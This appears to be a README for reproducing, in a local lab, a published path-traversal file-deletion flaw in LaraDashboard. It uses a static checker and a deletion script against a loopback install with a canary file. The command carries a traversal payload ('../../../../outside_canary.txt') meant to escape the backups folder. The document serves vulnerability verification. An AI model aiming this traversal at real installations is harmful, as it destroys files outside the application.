# Local-lab reproduction

## Static verification

Run against a checkout of an affected LaraDashboard release:

```bash
python3 static_verify.py /path/to/laradashboard
```

This checks for the vulnerable raw path concatenations and weak request validation. It does not modify the checkout.

## Canary deletion

Requirements:

- a disposable LaraDashboard installation on loopback;
- a non-Superadmin test user with `settings.view` and `settings.edit`;
- a valid authenticated session cookie and CSRF token;
- an intentionally created canary reachable from `storage/app/core-backups` using the supplied relative path.

```bash
python3 delete_canary.py \
  --base-url http://127.0.0.1:8000 \
  --cookie 'laravel_session=REPLACE_ME' \
  --csrf 'REPLACE_ME' \
  --relative-path '../../../../outside_canary.txt' \
  --execute
```

Confirm the canary existed before the request and inspect it afterwards. The script does not claim success based only on the HTTP redirect.

The original disclosure observed HTTP `302` and confirmed that canaries outside the application tree no longer existed. That observation is historical evidence from the published advisory, not output generated by this repository.
